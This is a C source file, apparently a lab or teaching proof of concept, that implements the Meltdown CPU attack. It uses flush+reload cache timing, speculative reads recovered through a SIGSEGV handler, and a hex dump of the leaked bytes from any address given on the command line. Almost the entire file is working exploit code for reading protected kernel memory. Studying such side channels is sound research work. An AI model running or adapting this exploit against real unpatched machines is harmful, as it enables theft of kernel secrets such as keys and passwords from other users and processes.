#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>

#define PAGE 4096 // Page size in bytes

int CACHE_HIT_THRESHOLD = 200;
int ONARTU = 3; 
int SAIAKERA_KOP = 100;  // Number of probe iterations to improve measurement accuracy

void print_address_content(uint64_t address, const uint8_t* data, size_t size);
void print_string(const uint8_t* data, size_t size);

// Buffer to store execution context for non-local jumps (used for handling segfaults)
static jmp_buf buf;

static int flush_reload(void *ptr) {
    uint64_t denb;

    asm __volatile__ (
        "mfence\n\t"                // Ensure all previous writes have completed
        "lfence\n\t"
        "rdtsc\n\t"                 // Read Time Stamp Counter ( start )
        "shl $32, %%rdx\n\t"        // Shift high bits into position
        "or %%rax, %%rdx\n\t"       // Combine high and low bits into RAX ( start_time )
        "mov %%rdx, %%r8\n\t"       // Save start time to r8

        "lfence\n\t"
        "mov (%%rdi), %%rax\n\t"    // Access memory address
        "lfence\n\t"
        // Read full 64 - bit timestamp counter before and after memory access,
        // then compute the timing difference to detect cache hits.
        "rdtscp\n\t"                // Read Time Stamp Counter ( end )
        "shl $32, %%rdx\n\t"        // Shift high bits into position
        "or %%rax, %%rdx\n\t"       // Combine high and low bits into RAX ( end_time )

        "sub %%r8, %%rdx\n\t"       // Compute time difference ( end_time - start_time )
        "mov %%rdx, %0\n\t"         // Save value
        :
        "=r"(denb)                  // Output
        :
        "D"(ptr)                    // Input
        : "%rax", "%rdx", "%r8", "rcx", "memory"
    );
    _mm_clflush(ptr);
    return (denb < CACHE_HIT_THRESHOLD);
}

static void unblock_signal(int signum) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}
// Signal handler for segmentation faults (SIGSEGV)
// Jumps back to the saved execution point in meltdown_attack
static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(buf, 1);
}

/*
 * meltdown_attack:
 * Tries to leak one byte from the given memory address `ptr` using
 * the Meltdown CPU vulnerability technique.
 *
 * Parameters:
 * - addr: the target memory address to read from (speculative read)
 * - probe_array: a buffer used to create timing side-channel via cache hits
 *
 * Returns:
 * - The guessed byte value read from the target address.
 */
uint8_t meltdown_attack(size_t addr, uint8_t* probe_array) {
    int saiakera_kop, i, leaked_value = 0;
    int hits[256] = {0};

    for (saiakera_kop = 0; saiakera_kop < SAIAKERA_KOP; saiakera_kop++) {
        // Flush probe_array from cache
        for (i = 0; i < 256; i++) {
            _mm_clflush(&probe_array[i * PAGE]);
        }

        asm volatile("mfence"); // Memory fence to enforce ordering

        // Try to read secret
        if (!setjmp(buf)) { // Save execution context
            asm volatile(// Speculative Execution Begins
                "movzx (%%rcx), %%rax\n"// Speculative read from protected memory.  This will cause a page fault later
                "shl $12, %%rax\n"// Multiply by 4096 (shift left 12 bits). Point to different 4 KB pages in probe_array
                "movq (%%rbx, %%rax, 1), %%rbx\n"// Speculative access to probe_array [ value * 4096]. Load a secret - dependent cache line
                :// Exception is raised (page fault)!
                : "c"(addr), "b"(probe_array)
                : "rax"
            );
        }

        // After fault, recover which page is cached
        for (i = 1; i < 256; i++) {
            if (flush_reload(&probe_array[i * PAGE])) {
                hits[i]++;
            }
        }
    }

    // Find the index (byte value) with the smallest access time (cache hit)
    for (i = 1; i < 256; i++) {
        if (hits[i] > hits[leaked_value] && hits[i] >= ONARTU) {
            leaked_value = i;
        }
    }

    return (uint8_t)leaked_value;
}

int main(int argc, char** argv) {
  int address, j;
  char *memoria_erreserbatu = malloc(PAGE * 300);
  if (!memoria_erreserbatu) {
    errno = ENOMEM;
    perror("malloc");
    return -1;
  }
  // Allocate the probe array buffer for cache timing
  char *probe_array = (char *)(((size_t)memoria_erreserbatu & ~0xfff) + 0x1000 * 2);
  memset(probe_array, 0xab, PAGE * 290);

  for (j = 0; j < 256; j++) {
    _mm_clflush(probe_array + j * PAGE);
  }
  // Register the SIGSEGV handler to catch segmentation faults
  signal(SIGSEGV, segfault_handler);

  size_t start_addr;
  uint64_t len;
  unsigned char ir_buffer[16];

  if (argc < 3) {
    free(memoria_erreserbatu);
    printf("Usage: ./meltdown <address> <bytes>\n");
    return -1;
  }else if (sscanf(argv[1], "%lx", &start_addr) != 1) {
    free(memoria_erreserbatu);
    printf("Usage: ./meltdown <address> <bytes>\n");
    return -1;
  }else if (sscanf(argv[2], "%lx", &len) != 1) {
    free(memoria_erreserbatu);
    printf("Usage: ./meltdown <address> <bytes>\n");
    return -1;
  }

  int fd = open("/proc/version", O_RDONLY);
  if (fd < 0) {
    perror("open");
    free(memoria_erreserbatu);
    return -1;
  }
  // Leak byte-by-byte from start_addr, storing results in buffer
  for (address = 0; address < len; address++) {
    if (address > 0 && 0 == address % 16) {
      print_address_content(start_addr + address - 16, ir_buffer, 16);
      print_string(ir_buffer, 16);
    }

    char tmp[256];
    memset(tmp, 0, sizeof(tmp)*sizeof(char));

    int ret = pread(fd, tmp, sizeof(tmp), 0);
    if (ret < 0) {
      perror("pread");
      free(memoria_erreserbatu);
      close(fd);
      return -1;
    }

    ir_buffer[address % 16] = meltdown_attack(start_addr + address, probe_array);
  }

  if (address > 0) {
      size_t tam_azkena = address % 16;
      if (tam_azkena == 0) tam_azkena = 16;
      size_t addr_azkena = start_addr + (address - tam_azkena);

      print_address_content(addr_azkena, ir_buffer, tam_azkena);
      print_string(ir_buffer, tam_azkena);
  }


  free(memoria_erreserbatu);
  close(fd);
  return 0;
}

/*
 * Prints a memory address and its contents in hex format,
 * 16 bytes per line, grouped in 8-byte blocks.
 */
void print_address_content(uint64_t address, const uint8_t* data, size_t size){
    printf("0x%016llx | ", (unsigned long long)address);
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", data[i]);
        if ((i + 1) % 8 == 0) {
            printf(" ");
        }
    }

    if (size < 16) {
        for (size_t i = size; i < 16; ++i) {
            printf("   ");
            if ((i + 1) % 8 == 0) {
                printf(" ");
            }
        }
    }
}

/*
 * Prints the ASCII representation of the given data,
 * replacing non-printable characters with dots.
 */
void print_string(const uint8_t* data, size_t size){
    printf("|  ");
    for (size_t i = 0; i < size; ++i) {
        char c = data[i];
        if (c >= ' ' && c <= '~') {
            putchar(c);
        } else {
            putchar('.');
        }
    }

    if (size < 16) {
        for (size_t i = size; i < 16; ++i) {
            putchar(' ');
        }
    }
    printf("\n");
}
